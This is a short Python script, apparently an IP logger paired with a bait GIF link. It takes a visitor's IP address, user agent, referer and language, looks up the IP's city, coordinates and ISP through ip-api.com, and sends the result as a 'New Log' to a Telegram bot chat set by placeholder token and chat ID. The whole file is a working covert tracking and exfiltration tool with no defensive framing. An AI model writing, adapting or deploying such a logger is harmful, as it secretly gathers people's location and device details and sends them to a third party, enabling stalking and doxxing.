import requests
from datetime import datetime

# /web/TELEGRAM/rayzer.py

BOT_TOKEN = "PUT_BOT_TOKEN_HERE"
CHAT_ID = "PUT_CHAT_ID_HERE"
GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif"

def send_to_telegram(ip, user_agent, referer, lang):
    try:
        geo_r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,query")
        geo = geo_r.json()
    except:
        geo = {}

    message = (
        "🔍 **New Log (Python)**\n\n"
        f"**IP:** `{ip}`\n"
        f"**Location:** {geo.get('city', '?')}, {geo.get('regionName', '?')}, {geo.get('country', '?')}\n"
        f"**Cords:** {geo.get('lat', '?')}, {geo.get('lon', '?')}\n"
        f"**ISP:** {geo.get('isp', 'Unknown')}\n"
        f"**User-Agent:** `{user_agent}`\n"
        f"**Referer:** {referer}\n"
        f"**Language:** {lang}\n\n"
        "📅 " + datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    })
